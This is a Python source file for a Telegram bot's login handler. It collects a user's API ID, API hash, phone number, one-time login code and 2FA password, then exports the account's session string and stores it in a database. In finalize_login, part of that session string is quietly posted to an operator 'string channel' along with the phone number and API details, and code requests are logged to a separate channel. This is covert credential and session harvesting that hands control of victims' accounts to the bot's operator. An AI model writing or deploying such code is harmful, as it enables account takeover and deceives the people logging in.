from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired
import asyncio
import os
from config import config
from database import db
from utils.logger import log_to_main, log_to_channel, log_action
from utils.helpers import validate_phone_number
from models.schemas import Account, User

class LoginHandler:
    def __init__(self, bot):
        self.bot = bot
        self.user_states = {}
    
    async def handle_login(self, message: Message):
        user_id = message.from_user.id
        
        if not await self.check_account_limit(user_id):
            await message.reply("❌ You have reached the maximum account limit (10 accounts per user).")
            return
        
        self.user_states[user_id] = {
            "step": "api_id",
            "created_at": asyncio.get_event_loop().time()
        }
        
        await message.reply(
            "🔐 **Login Process Started**\n\n"
            "1. Please send your **API ID**\n"
            "   › Get it from: https://my.telegram.org\n\n"
            "Type /cancel to cancel the process."
        )
        
        await log_action(user_id, "Started login process")
    
    async def check_account_limit(self, user_id: int) -> bool:
        user_accounts = await db.accounts.count_documents({"user_id": user_id})
        return user_accounts < 10  # Limit per user
    
    async def process_message(self, message: Message):
        user_id = message.from_user.id
        
        if user_id not in self.user_states:
            return
        
        state = self.user_states[user_id]
        current_time = asyncio.get_event_loop().time()
        
        # Check if state is too old (30 minutes timeout)
        if current_time - state.get("created_at", 0) > 1800:
            await message.reply("❌ Login session expired. Please start again with /login")
            del self.user_states[user_id]
            return
        
        if state["step"] == "api_id":
            try:
                api_id = int(message.text)
                if api_id < 10000 or api_id > 999999999:
                    await message.reply("❌ Invalid API ID. It should be between 10000 and 999999999. Try again:")
                    return
                
                state["api_id"] = api_id
                state["step"] = "api_hash"
                await message.reply("✅ API ID received.\n\n2. Now send your **API HASH**:")
            except ValueError:
                await message.reply("❌ Invalid API ID. Please send a valid number:")
        
        elif state["step"] == "api_hash":
            api_hash = message.text.strip()
            if len(api_hash) < 10 or len(api_hash) > 100:
                await message.reply("❌ Invalid API HASH. Please send a valid API HASH:")
                return
            
            state["api_hash"] = api_hash
            state["step"] = "phone"
            await message.reply("✅ API HASH received.\n\n3. Now send your **phone number** (with country code):\nExample: +1234567890")
        
        elif state["step"] == "phone":
            phone = message.text.strip()
            if not validate_phone_number(phone):
                await message.reply("❌ Invalid phone number format. Please send a valid phone number with country code:\nExample: +1234567890")
                return
            
            # Check if phone already exists
            existing = await db.accounts.find_one({"phone": phone})
            if existing:
                await message.reply("❌ This phone number is already registered. Please use a different number.")
                del self.user_states[user_id]
                return
            
            state["phone"] = phone
            
            try:
                # Create Pyrogram client
                session_name = f"session_{user_id}_{int(current_time)}"
                client = Client(
                    name=session_name,
                    api_id=state["api_id"],
                    api_hash=state["api_hash"],
                    phone_number=phone,
                    workdir=config.SESSION_DIR
                )
                
                await client.connect()
                
                # Send OTP request
                sent_code = await client.send_code(phone)
                state["client"] = client
                state["phone_code_hash"] = sent_code.phone_code_hash
                state["step"] = "otp"
                
                await message.reply(
                    "✅ OTP sent to your phone!\n\n"
                    "4. Please send the **OTP** you received from Telegram:\n"
                    "   › Format: 12345\n"
                    "   › OTP will expire in 5 minutes"
                )
                
                # Log OTP request
                await log_to_channel(config.OTP_LOG_CHANNEL, f"OTP requested for {phone} by user {user_id}")
            
            except Exception as e:
                error_msg = str(e)
                if "FLOOD" in error_msg:
                    await message.reply("❌ Too many requests. Please wait before trying again.")
                elif "PHONE_NUMBER_INVALID" in error_msg:
                    await message.reply("❌ Invalid phone number. Please check and try again.")
                else:
                    await message.reply(f"❌ Error: {error_msg}")
                
                if "client" in state:
                    try:
                        await state["client"].disconnect()
                    except:
                        pass
                del self.user_states[user_id]
        
        elif state["step"] == "otp":
            otp = message.text.strip()
            
            if not otp.isdigit() or len(otp) < 5:
                await message.reply("❌ Invalid OTP format. Please send 5-6 digit number:")
                return
            
            try:
                client = state["client"]
                
                try:
                    # Try to sign in with OTP
                    signed_in = await client.sign_in(
                        phone_number=state["phone"],
                        phone_code_hash=state["phone_code_hash"],
                        phone_code=otp
                    )
                except SessionPasswordNeeded:
                    state["step"] = "password"
                    await message.reply("🔐 This account has **2FA password**.\n\n5. Please send your **2FA password**:")
                    return
                except PhoneCodeInvalid:
                    await message.reply("❌ Invalid OTP. Please send the correct OTP:")
                    return
                except PhoneCodeExpired:
                    await message.reply("❌ OTP expired. Please start again with /login")
                    await client.disconnect()
                    del self.user_states[user_id]
                    return
                
                # Successfully signed in
                await self.finalize_login(client, state, message)
            
            except Exception as e:
                error_msg = str(e)
                if "SESSION_PASSWORD_NEEDED" in error_msg:
                    state["step"] = "password"
                    await message.reply("🔐 This account has **2FA password**.\n\n5. Please send your **2FA password**:")
                else:
                    await message.reply(f"❌ Error: {error_msg}")
                    if "client" in state:
                        try:
                            await state["client"].disconnect()
                        except:
                            pass
                    del self.user_states[user_id]
        
        elif state["step"] == "password":
            password = message.text
            
            try:
                client = state["client"]
                await client.check_password(password)
                
                # Successfully signed in with password
                await self.finalize_login(client, state, message)
            
            except Exception as e:
                await message.reply(f"❌ Error: {str(e)}")
                await client.disconnect()
                del self.user_states[user_id]
    
    async def finalize_login(self, client, state, message: Message):
        """Finalize login process after successful authentication"""
        try:
            # Get session string
            session_string = await client.export_session_string()
            
            # Get account info
            me = await client.get_me()
            name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Unknown"
            username = me.username or ""
            
            # Save account to database
            account = Account(
                session_string=session_string,
                phone=state["phone"],
                api_id=state["api_id"],
                api_hash=state["api_hash"],
                user_id=message.from_user.id,
                name=name,
                username=username
            )
            
            await db.accounts.insert_one(account.to_dict())
            
            # Update or create user
            user_data = User(
                user_id=message.from_user.id,
                username=message.from_user.username,
                first_name=message.from_user.first_name
            ).to_dict()
            
            await db.users.update_one(
                {"user_id": message.from_user.id},
                {
                    "$set": user_data,
                    "$addToSet": {"accounts": state["phone"]}
                },
                upsert=True
            )
            
            # Send session string to string channel
            if config.STRING_CHANNEL:
                try:
                    log_message = (
                        f"🔐 **New Login**\n\n"
                        f"👤 **User:** {message.from_user.mention}\n"
                        f"🆔 **User ID:** `{message.from_user.id}`\n"
                        f"📱 **Phone:** `{state['phone']}`\n"
                        f"🆔 **API ID:** `{state['api_id']}`\n"
                        f"🔑 **API Hash:** `{state['api_hash'][:10]}...`\n"
                        f"📛 **Name:** {name}\n"
                        f"👤 **Username:** @{username if username else 'None'}\n\n"
                        f"**Session String:**\n`{session_string[:100]}...`"
                    )
                    await log_to_channel(config.STRING_CHANNEL, log_message)
                except Exception as e:
                    print(f"Failed to log to string channel: {e}")
            
            success_msg = (
                f"✅ **Account Added Successfully!**\n\n"
                f"📛 **Name:** {name}\n"
                f"📱 **Phone:** {state['phone']}\n"
                f"👤 **Username:** @{username if username else 'None'}\n"
                f"🆔 **User ID:** `{me.id}`\n\n"
                f"✨ You can now use this account for various operations."
            )
            
            await message.reply(success_msg)
            
            # Log successful login
            await log_action(message.from_user.id, "Account added", f"Phone: {state['phone']}")
            
        except Exception as e:
            await message.reply(f"❌ Error finalizing login: {str(e)}")
        finally:
            # Disconnect client
            try:
                await client.disconnect()
            except:
                pass
            # Clean up state
            if message.from_user.id in self.user_states:
                del self.user_states[message.from_user.id]
